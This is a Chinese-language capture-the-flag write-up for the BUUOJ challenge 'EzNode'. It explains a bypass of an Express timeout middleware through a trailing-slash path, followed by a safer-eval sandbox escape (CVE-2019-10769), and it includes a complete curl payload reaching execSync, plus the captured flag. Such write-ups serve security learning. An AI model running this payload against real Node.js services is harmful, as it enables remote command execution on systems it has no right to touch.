# EZ三剑客-EzNode 解题报告

## 题目信息
- 题目名称：EZ三剑客-EzNode
- 题目地址：http://da997913-90c9-46ce-8dc3-58f285ccd975.node5.buuoj.cn:81
- 考点：Express 路由漏洞 + safer-eval 沙盒逃逸 (CVE-2019-10769)

## 解题思路

### 第一步：信息收集与源码分析

目标是一个 Node.js 计算器应用，源码可通过 `/source` 获取。核心逻辑如下：

1. **后端使用 `safer-eval` 1.3.6** 库执行用户输入的表达式
2. **超时中间件** 拦截 `/eval` 路径：
   - 设置一个定时器在 `delay` ms 后调用 `next()`（minimum 60秒）
   - 设置另一个定时器在 1000ms 后清除第一个定时器并返回 "Timeout!"
3. **POST /eval 路由处理器** 执行 `saferEval(req.body.e)`

### 第二步：突破点分析

#### 超时中间件绕过（剑客1）

关键观察：中间件检查 `req.path === '/eval'`，而 Express 路由使用 `app.post('/eval', ...)`。Express 4.x 默认关闭 strict routing，意味着 `/eval` 同时匹配 `/eval` 和 `/eval/`。

但由于中间件的严格比较（`===`），`req.path` 为 `/eval/` 时不等于 `/eval`，因此中间件直接调用 `next()` 放行请求到路由处理器。

**即**：发送 POST 请求到 `/eval/` 而非 `/eval` 即可跳过超时中间件。

#### safer-eval 沙盒逃逸（剑客2、剑客3）

`safer-eval` 1.3.6 存在已知沙盒逃逸漏洞（CVE-2019-10769）。虽然 `Function` 和 `process` 在沙盒中被屏蔽，但 `Buffer` 对象来自外层上下文，其 `.constructor` 属性是外层的真正 `Function` 构造函数。

利用链：
```
Buffer.constructor → 外层 Function
Function('return process')() → 外层 process 对象
process.mainModule.require('child_process').execSync('cat /flag').toString() → Flag
```

### 第三步：完整 Exploit

```bash
# 绕过超时中间件 + 沙盒逃逸 + RCE
curl -s -X POST "http://target:81/eval/" \
  --data-urlencode "e=Buffer.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()"
```

## 最终结果
```
flag{368a17c2-d064-4ebe-b8c4-cd2ba1e80690}
```

## 考点总结

1. **Express 路由的 strict routing 特性** — 默认关闭时，路由 `/xxx` 会同时匹配 `/xxx` 和 `/xxx/`
2. **Node.js 沙盒逃逸** — 通过外层传递的 `Buffer` 对象的 `constructor` 属性，获取真正的 `Function` 构造函数，突破 `vm` 沙盒
3. **safer-eval 的局限性** — 该库作者已承认无法安全地处理用户输入

## 参考
- CVE-2019-10769: safer-eval Sandbox Escape
